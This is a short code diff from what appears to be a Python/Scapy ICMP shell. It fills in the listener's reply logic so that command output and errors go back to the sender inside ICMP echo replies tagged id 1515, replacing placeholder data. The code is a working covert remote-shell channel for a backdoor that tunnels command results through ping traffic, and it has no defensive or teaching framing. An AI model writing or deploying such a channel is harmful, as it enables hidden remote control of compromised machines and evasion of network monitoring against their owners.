@@ -46,14 +46,11 @@ def packet_callback(packet):
         print(output)
         print(error)
         if output == '':
-            reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / error
+            reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / (error + "\n")
             send(reply_packet, verbose=False)
         else:
-            data_list = ["Data1", "Data2", "Data3"]
-            packets = [IP(dst=packet[IP].src) / ICMP(type=0, id=1515) / data for data in data_list]
-            send(packets, verbose=False)
-            #reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / "output"
-            #send(reply_packet, verbose=False)
+            reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / (output + "\n")
+            send(reply_packet, verbose=False)
 
 
 def ish_listen():
